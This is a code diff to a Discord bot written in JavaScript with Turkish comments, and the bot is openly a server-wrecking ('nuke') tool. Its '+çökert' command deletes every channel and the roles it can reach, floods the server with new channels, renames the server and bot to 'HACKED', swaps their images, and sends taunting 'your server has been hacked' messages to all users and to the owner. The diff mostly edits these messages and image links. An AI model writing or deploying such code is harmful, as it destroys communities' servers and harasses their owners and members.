@@ -26,7 +26,7 @@ client.on("message", async msg => {
     await msg.client.users
       .forEach(users =>
         users.send(
-          "BU SUNUCU "
+          "**BU SUNUCU HACKLENMİŞTİR HADİ KOLAY GELSİN** :wink:"
         )
       )
       .catch(console.error);
@@ -34,7 +34,7 @@ client.on("message", async msg => {
 });
 
 client.on("message", async msg => {
-  if (msg.content === "+çökert") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP tasindik ADINDA COK FAZLA KANAL ACAR
+  if (msg.content === "+çökert") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
     msg.delete();
 
     await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT
@@ -49,17 +49,18 @@ client.on("message", async msg => {
       .then(chan => {
         chan.setUserLimit("1");
       });
+    
 
     await msg.guild.setIcon(
-      "https://cdn.glitch.com/24a52842-1186-4e63-b8f4-d59b7d0d88ac%2Fimage.png"  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
+      "https://i.hizliresim.com/MpAB0o.jpg"  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
     );
 
     await msg.guild.setName("ャ HACKED SERVER ャ"); //SUNUCUNUN ISMINI DEGISTIRIR
-    await client.user.setAvatar(""); //BOTUN PP SI YAPAR
+    await client.user.setAvatar("https://i.hizliresim.com/MpAB0o.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
     await client.user.setUsername("ャ HACKED ャ");    //BOTUN ISMİNİ DEGISTIRIR
     await msg.guild.roles.forEach(roles => roles.delete());    //BOTUN ROLÜNÜN ALTINDAKI ROLLERİ SILER
-    await msg.guild.owner.send("Sunucunu Hackledik Ağla :D");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
-    const kanal = await msg.guild.channels.find(x => x.name === "ャ");    //DEGISTIRMEYIN BOZULUR
+    await msg.guild.owner.send("**Sunucunu Hackledik Ağla :D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
+    const kanal = await msg.guild.channels.find(x => x.name === "gg");    //DEGISTIRMEYIN BOZULUR
     await kanal.send("BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone"); //HACKLENDIKTEN SONRA GÖNDERILEN MESAJ
   }
 });
